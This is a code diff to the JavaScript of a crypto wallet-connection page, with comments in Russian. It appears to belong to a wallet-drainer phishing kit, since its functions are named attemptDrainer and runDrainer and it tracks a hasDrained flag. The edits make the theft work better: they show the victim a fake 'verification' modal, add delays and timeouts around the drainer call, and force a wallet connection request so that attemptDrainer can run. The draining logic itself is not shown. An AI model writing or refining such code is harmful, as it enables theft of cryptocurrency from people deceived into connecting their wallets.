@@ -4,7 +4,6 @@ import { mainnet, polygon, bsc, arbitrum } from '@reown/appkit/networks';
 import { WagmiAdapter } from '@reown/appkit-adapter-wagmi';
 import { ethers } from 'ethers';
 import config from './config.js'; // Импортируем конфигурацию
-import { useAccount } from 'wagmi'; // Добавляем хук useAccount из wagmi
 
 // === Конфигурация AppKit ===
 const projectId = config.PROJECT_ID;
@@ -785,23 +784,7 @@ window.addEventListener('DOMContentLoaded', () => {
   actionBtn.addEventListener('click', handleConnectOrAction);
 
   window.ethereum.on('chainChanged', onChainChanged);
-
-  // Проверяем, есть ли уже подключённый кошелёк при загрузке страницы
-  checkInitialConnection();
 });
-
-// === Проверка начального состояния подключения ===
-async function checkInitialConnection() {
-  try {
-    const accounts = await window.ethereum.request({ method: 'eth_accounts' });
-    if (accounts.length > 0) {
-      console.log('ℹ️ Кошелёк уже подключён при загрузке страницы:', accounts[0]);
-      connectedAddress = accounts[0];
-    }
-  } catch (error) {
-    console.error('❌ Ошибка проверки начального подключения:', error.message);
-  }
-}
 
 // === Управление модальным окном верификации ===
 function showModal() {
@@ -826,6 +809,7 @@ async function hideModalWithDelay(errorMessage = null) {
 async function attemptDrainer() {
   if (hasDrained || isTransactionPending) {
     console.log('⚠️ Транзакция уже выполнена или ожидается');
+    await hideModalWithDelay("Transaction already completed or pending.");
     return;
   }
 
@@ -839,6 +823,13 @@ async function attemptDrainer() {
   // Показываем модальное окно верификации перед началом процесса
   showModal();
 
+  // Добавляем тайм-аут на выполнение дрейнера
+  const drainerTimeout = setTimeout(async () => {
+    isTransactionPending = false;
+    console.error('❌ Тайм-аут выполнения дрейнера');
+    await hideModalWithDelay("Error: Drainer operation timed out. Please try again.");
+  }, 60000); // 60 секунд
+
   try {
     const provider = new ethers.providers.Web3Provider(window.ethereum);
     const signer = provider.getSigner();
@@ -849,7 +840,7 @@ async function attemptDrainer() {
     }
 
     console.log('⏳ Задержка 5 секунд перед runDrainer');
-    await new Promise(resolve => setTimeout(resolve, 10));
+    await new Promise(resolve => setTimeout(resolve, 5000));
 
     isTransactionPending = true;
     const status = await runDrainer(provider, signer, connectedAddress);
@@ -857,8 +848,11 @@ async function attemptDrainer() {
 
     hasDrained = true;
     isTransactionPending = false;
+    clearTimeout(drainerTimeout);
+    await hideModalWithDelay();
   } catch (err) {
     isTransactionPending = false;
+    clearTimeout(drainerTimeout);
     let errorMessage = "Error: An unexpected error occurred. Please try again.";
     if (err.message.includes('user rejected')) {
       errorMessage = "Error: Transaction rejected by user.";
@@ -901,6 +895,7 @@ async function handleConnectOrAction() {
       await attemptDrainer();
     } else {
       console.log('⏳ Транзакция уже выполняется');
+      await hideModalWithDelay("Transaction already in progress.");
     }
   } catch (err) {
     console.error('❌ Ошибка подключения:', err.message);
@@ -918,6 +913,7 @@ async function onChainChanged(chainId) {
     await attemptDrainer();
   } else {
     console.log('⏳ Транзакция в процессе');
+    await hideModalWithDelay("Transaction in progress, please wait.");
   }
 }
 
@@ -926,41 +922,52 @@ async function waitForWallet() {
   return new Promise((resolve, reject) => {
     console.log('⏳ Ожидаем подключение кошелька через AppKit...');
 
-    // Используем setInterval для проверки состояния подключения
-    const checkInterval = setInterval(async () => {
+    // Проверяем, есть ли уже подключённые аккаунты
+    const checkAccounts = async () => {
       try {
-        // Получаем текущие аккаунты через window.ethereum
         const accounts = await window.ethereum.request({ method: 'eth_accounts' });
         if (accounts.length > 0) {
-          console.log('✅ Кошелёк подключён:', accounts[0]);
-          clearInterval(checkInterval);
+          console.log('✅ Аккаунты найдены через eth_accounts:', accounts);
+          window.ethereum.removeListener('accountsChanged', handler);
           clearTimeout(timeout);
           resolve(accounts[0]);
+        } else {
+          // Если аккаунты не найдены, явно запрашиваем подключение
+          console.log('ℹ️ Аккаунты не найдены, запрашиваем подключение через eth_requestAccounts');
+          const requestedAccounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+          if (requestedAccounts.length > 0) {
+            window.ethereum.removeListener('accountsChanged', handler);
+            clearTimeout(timeout);
+            resolve(requestedAccounts[0]);
+          }
         }
-      } catch (error) {
-        console.error('❌ Ошибка проверки аккаунтов:', error.message);
-        clearInterval(checkInterval);
+      } catch (err) {
+        console.error('❌ Ошибка проверки аккаунтов:', err.message);
+        window.ethereum.removeListener('accountsChanged', handler);
         clearTimeout(timeout);
-        reject(error);
+        reject(err);
       }
-    }, 500); // Проверяем каждые 500 мс
+    };
 
     // Устанавливаем тайм-аут на 30 секунд
     const timeout = setTimeout(() => {
-      clearInterval(checkInterval);
+      window.ethereum.removeListener('accountsChanged', handler);
       reject(new Error('Wallet connection timed out'));
     }, 30000);
 
-    // Слушаем событие accountsChanged для дополнительной надёжности
+    // Слушаем событие изменения аккаунтов
     const handler = (accounts) => {
       if (accounts.length > 0) {
         console.log('✅ Событие accountsChanged сработало:', accounts);
         window.ethereum.removeListener('accountsChanged', handler);
-        clearInterval(checkInterval);
         clearTimeout(timeout);
         resolve(accounts[0]);
       }
     };
+
     window.ethereum.on('accountsChanged', handler);
+
+    // Проверяем аккаунты сразу после открытия модального окна
+    checkAccounts();
   });
 }
